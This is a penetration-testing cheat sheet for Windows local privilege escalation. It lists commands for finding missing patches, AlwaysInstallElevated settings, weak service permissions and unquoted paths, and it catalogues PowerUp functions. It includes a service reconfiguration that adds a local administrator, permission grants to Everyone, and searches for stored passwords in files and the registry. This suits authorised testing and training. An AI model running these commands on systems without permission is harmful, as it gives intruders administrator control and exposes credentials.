---
description: Local Privilege Escalation on Windows machine
---

# III - Local Privilege Esc

## Most common issues:

### Missing Patches

Get system information from Windows CMD:

```text
systeminfo
```

Use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) on attacker machine \(KALI\):

```text
./windows-exploit-suggester.py --update
/windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

### Autologon

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
```

### **Always** **install** **elevated:**

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

### Insecure services

```text
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
services.msc

sc qc Spooler
sc config Spooler obj= ".\LocalSystem" password= ""
sc config WebDriveService binpath= "net localgroup administrators rtest /add"
sc start WebDriveService
```

### Unquoted Paths

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

### Permissions

```text
takeown /R /F file1.txt
icacls file1.txt /t /c /GRANT Everyone:F
```

### Sensitive Information in files

```text
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Automated Scripts:

### [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

Run All Checks:

```text
Invoke-AllChecks
```

Service Enumeration

```text
Get-ServiceUnquoted        # returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile  # returns services where the current user can write to the service binary path or its config
Get-ModifiableService      # returns services the current user can modify
Get-ServiceDetail          # returns detailed information about a specified service
```

Service Abuse

```text
Invoke-ServiceAbuse     # modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary     # writes out a patched C # service binary that adds a local admin or executes a custom command
Install-ServiceBinary   # replaces a service binary with one that adds a local admin or executes a custom command
Restore-ServiceBinary   # restores a replaced service binary with the original executable
```

DLL Hijacking

```text
Find-ProcessDLLHijack  # finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack     # finds service %PATH% DLL hijacking opportunities
Write-HijackDll        # writes out a hijackable DLL
```

Registry Checks

```text
Get-RegistryAlwaysInstallElevated   # checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               # checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       # checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
```

Miscellaneous Checks

```text
Get-ModifiableScheduledTaskFile  # find schtasks with modifiable target files
Get-UnattendedInstallFile        # finds remaining unattended installation files
Get-Webconfig                    # checks for any encrypted web.config strings
Get-ApplicationHost              # checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword             # retrieves the plaintext passwords for any found McAfee`'s SiteList.xml files
Get-CachedGPPPassword            # checks for passwords in cached Group Policy Preferences files
```

Other Helpers/Meta-Functions

```text
Get-ModifiablePath            # tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid  # returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl               # adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath            # sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission    # tests one or more passed services or service names against a given permission set
Write-UserAddMSI              # write out a MSI installer that prompts for a user to be added

```

### BeRoot

{% embed url="https://github.com/AlessandroZ/BeRoot" %}

### PrivEsc

{% embed url="https://github.com/enjoiz/Privesc/blob/master/privesc.ps1" %}

```text
Invoke-Privesc
```

